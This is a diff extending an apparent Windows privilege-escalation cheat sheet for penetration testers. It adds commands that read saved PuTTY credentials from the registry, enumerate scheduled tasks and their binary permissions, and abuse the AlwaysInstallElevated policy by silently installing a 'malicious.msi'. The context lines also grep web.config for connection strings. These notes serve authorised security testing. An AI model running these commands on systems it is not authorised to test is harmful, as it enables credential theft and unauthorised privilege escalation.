@@ -25,6 +25,36 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
+## Retrieve Creds from "PuTTy"
+```ps1
+reg query HKEY_CURRENT_USER\Software\<creatorOFputty>\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+
+# Scheduled Tasks:
+```ps1
+# list of Scheduled Tasks:
+schtasks
+# for more details on specific task:
+schtasks /query /tn vulntask /fo list /v
+# check permissions on its binary:
+icacls c:\Path\to\executableFile
+get-acl c:\Path\to\executableFile
+```
+# Always Install Elevated:
++ check registry:
+	+ C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+	+ C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer	
++ install package from commandLine:
+	+ C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+
+
+
+
+
+
+
 
 
 
